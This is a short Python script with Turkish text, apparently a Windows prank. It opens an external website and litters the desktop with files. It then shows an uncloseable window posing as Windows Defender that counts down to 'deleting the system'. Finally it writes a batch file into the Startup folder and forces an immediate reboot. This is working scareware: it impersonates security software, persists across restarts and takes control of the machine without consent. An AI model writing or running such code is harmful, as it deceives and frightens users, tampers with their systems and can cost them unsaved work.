import webbrowser
import os
import time
import customtkinter as ctk
from tkinter import messagebox
import winsound  


ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")


webbrowser.open("https://legacytsla.github.io/kefopasa.github.io/")
time.sleep(10)


desktop = os.path.join(os.path.expanduser("~"), "Desktop")

for i in range(1, 6):
    open(os.path.join(desktop, f"dosya{i}.txt"), "w").close()

with open(os.path.join(desktop, "ERROR.txt"), "w") as f:
    f.write("Windows Defender: Şüpheli etkinlik algılandı.\nSistem Siliniyor...")


def goster_geri_sayim():
    kalan = 10
    def geri_say():
        nonlocal kalan
        if kalan > 0:
            winsound.MessageBeep()  
            etiket.configure(text=f"⚠ Sistem Siliniyor... {kalan}")
            kalan -= 1
            pencere.after(1000, geri_say)
        else:
            etiket.configure(text="Dosyalar siliniyor...")
            time.sleep(2)
            etiket.configure(text="Silme işlemi başarısız!")
            time.sleep(1)

            
            startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            prank_path = os.path.join(startup_folder, "sakadosyasi.bat")

            with open(prank_path, "w") as f:
                f.write(f'echo ŞAKALANDIN! > "{desktop}\\ŞAKALANDIN.txt"\n')

            
            os.system("shutdown /r /t 3")
            pencere.destroy()

    geri_say()


pencere = ctk.CTk()
pencere.title("Windows Defender")
pencere.geometry("400x200")
pencere.protocol("WM_DELETE_WINDOW", lambda: None)

etiket = ctk.CTkLabel(pencere, text="⚠ Sistem Siliniyor...", text_color="red", font=("Arial", 20))
etiket.pack(pady=30)

buton = ctk.CTkButton(pencere, text="BAŞLAT", command=goster_geri_sayim, fg_color="red", hover_color="darkred")
buton.pack()

pencere.mainloop()
